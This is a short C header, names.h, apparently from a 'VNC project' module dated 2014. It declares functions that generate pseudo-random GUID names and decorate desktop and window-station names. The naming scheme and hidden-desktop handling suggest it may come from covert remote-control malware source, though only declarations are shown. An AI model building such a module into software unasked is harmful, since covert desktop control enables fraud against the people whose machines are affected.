//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: names.h
// $Revision: 166 $
// $Date: 2014-02-14 19:47:48 +0400 (Пт, 14 фев 2014) $
// description:
//	Pseudo-random names generation engine.

#define		szLocal				_T("Local\\")
#define		GUID_STR_LENGTH		16*2+4+2	// length of the GUID string in chars (not including NULL-char)

LPTSTR	GenGuidName(PULONG pSeed, LPTSTR Prefix OPTIONAL, LPTSTR Postfix OPTIONAL, BOOL bQuoted);
VOID	FillGuidName(PULONG	pSeed, LPTSTR pGuidName);

LPWSTR DecorateNameW(PVNC_DESKTOP pDesktop, LPWSTR szName);
LPSTR DecorateNameA(PVNC_DESKTOP pDesktop, LPSTR szName);

LPSTR DecorateDesktopNameA(PVNC_DESKTOP pDesktop, LPSTR szName);
LPWSTR DecorateDesktopNameW(PVNC_DESKTOP pDesktop, LPWSTR szName);

LPSTR UndcorateDesktopNameA(PVNC_DESKTOP pDesktop, LPSTR szName);
LPWSTR UndcorateDesktopNameW(PVNC_DESKTOP pDesktop, LPWSTR szName);

LPWSTR DecorateDeskWinstaNameW(PVNC_DESKTOP pDesktop, LPWSTR szName);
LPSTR DecorateDeskWinstaNameA(PVNC_DESKTOP pDesktop, LPSTR szName);

